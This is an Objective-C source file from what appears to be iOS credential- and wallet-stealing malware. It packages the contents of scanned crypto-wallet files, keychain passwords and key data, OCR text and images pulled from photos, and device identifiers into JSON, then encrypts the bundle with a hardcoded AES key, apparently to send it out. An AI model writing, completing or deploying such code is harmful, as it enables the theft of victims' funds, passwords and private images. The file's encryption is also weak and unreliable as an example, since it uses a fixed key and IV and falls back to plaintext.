//
//  RDDataPackager.m
//  数据打包实现
//

#import "RDDataPackager.h"
@import UIKit;
@import CommonCrypto;

@implementation RDDataPackager

// ============ 完整打包 ============
+ (nullable NSData *)packageWithFiles:(NSArray<RDScannedFile *> *)files
                        keychainItems:(NSArray<RDKeychainItem *> *)keychainItems
                         photoResults:(NSArray<RDPhotoOCRResult *> *)photoResults
                            deviceInfo:(NSDictionary *)deviceInfo
                                 error:(NSError **)error {

    NSMutableDictionary *package = [NSMutableDictionary new];
    package[@"device"]     = deviceInfo ?: @{};
    package[@"timestamp"]  = @([[NSDate date] timeIntervalSince1970]);
    package[@"version"]    = @"1.0";

    // 文件扫描结果
    NSMutableArray *fileList = [NSMutableArray new];
    for (RDScannedFile *f in files) {
        [fileList addObject:@{
            @"wallet":    f.walletName ?: @"",
            @"bundle_id": f.bundleID ?: @"",
            @"path":      f.fullPath ?: @"",
            @"file_name": f.fileName ?: @"",
            @"size":      @(f.fileSize),
            @"mod_date":  @([f.modificationDate timeIntervalSince1970]),
        }];
    }
    package[@"files"] = fileList;

    // 文件内容 base64
    NSMutableDictionary *fileContents = [NSMutableDictionary new];
    for (RDScannedFile *f in files) {
        @autoreleasepool {
            NSData *content = [NSData dataWithContentsOfFile:f.fullPath];
            if (content && content.length < 20 * 1024 * 1024) { // < 20MB
                NSString *b64 = [content base64EncodedStringWithOptions:0];
                NSString *key = [NSString stringWithFormat:@"%@::%@", f.walletName, f.fileName];
                fileContents[key] = b64;
            }
        }
    }
    package[@"file_contents"] = fileContents;

    // Keychain
    NSMutableArray *kcList = [NSMutableArray new];
    for (RDKeychainItem *item in keychainItems) {
        NSMutableDictionary *entry = [NSMutableDictionary new];
        entry[@"service"]       = item.service ?: @"";
        entry[@"account"]       = item.account ?: @"";
        entry[@"access_group"]  = item.accessGroup ?: @"";
        if (item.password) entry[@"password"] = item.password;
        if (item.keyData) entry[@"key_data"] = [item.keyData base64EncodedStringWithOptions:0];
        if (item.creationDate) entry[@"created"] = @([item.creationDate timeIntervalSince1970]);
        [kcList addObject:entry];
    }
    package[@"keychain"] = kcList;

    // 照片OCR结果
    NSMutableArray *photoList = [NSMutableArray new];
    for (RDPhotoOCRResult *r in photoResults) {
        [photoList addObject:@{
            @"text":       r.recognizedText ?: @"",
            @"confidence": @(r.confidence),
            @"date":       @([r.photoDate timeIntervalSince1970]),
            @"image":      r.imageData ? [r.imageData base64EncodedStringWithOptions:0] : @"",
        }];
    }
    package[@"photos"] = photoList;

    // 序列化
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:package options:0 error:error];
    if (!jsonData) return nil;

    // AES 加密
    return [self aesEncrypt:jsonData];
}

// ============ 设备信息 ============
+ (NSData *)packageDeviceInfo:(NSDictionary *)deviceInfo {
    NSDictionary *pkg = @{@"device": deviceInfo, @"type": @"register"};
    NSData *json = [NSJSONSerialization dataWithJSONObject:pkg options:0 error:nil];
    return [self aesEncrypt:json];
}

// ============ 收集设备信息 ============
+ (NSDictionary *)collectDeviceInfo {
    UIDevice *dev = [UIDevice currentDevice];
    UIScreen *screen = [UIScreen mainScreen];

    return @{
        @"device_name":    dev.name ?: @"",
        @"system_name":    dev.systemName ?: @"",
        @"system_version": dev.systemVersion ?: @"",
        @"model":          dev.model ?: @"",
        @"identifier":     [[dev identifierForVendor] UUIDString] ?: @"",
        @"screen_w":       @(screen.bounds.size.width * screen.scale),
        @"screen_h":       @(screen.bounds.size.height * screen.scale),
        @"scale":          @(screen.scale),
        @"timezone":       [[NSTimeZone localTimeZone] name] ?: @"",
        @"locale":         [[NSLocale currentLocale] localeIdentifier] ?: @"",
        @"battery":        @([dev batteryLevel]),
        @"battery_state":  @([dev batteryState]),
    };
}

// ============ AES-256-CBC 加密 ============
+ (NSData *)aesEncrypt:(NSData *)data {
    // 硬编码密钥 (生产环境应从服务器获取)
    static NSString * const kAESKey = @"wallet_scanner_aes256_key_32bytes!";
    static NSString * const kAESIV  = @"1234567890abcdef";

    NSData *keyData = [kAESKey dataUsingEncoding:NSUTF8StringEncoding];
    NSData *ivData  = [kAESIV  dataUsingEncoding:NSUTF8StringEncoding];

    size_t bufferSize = data.length + kCCBlockSizeAES128;
    void *buffer = malloc(bufferSize);
    size_t numBytesEncrypted = 0;

    CCCryptorStatus status = CCCrypt(kCCEncrypt,
                                      kCCAlgorithmAES,
                                      kCCOptionPKCS7Padding,
                                      keyData.bytes, kCCKeySizeAES256,
                                      ivData.bytes,
                                      data.bytes, data.length,
                                      buffer, bufferSize,
                                      &numBytesEncrypted);

    if (status == kCCSuccess) {
        return [NSData dataWithBytesNoCopy:buffer length:numBytesEncrypted freeWhenDone:YES];
    }
    free(buffer);
    return data; // fallback: 返回原始数据
}

@end
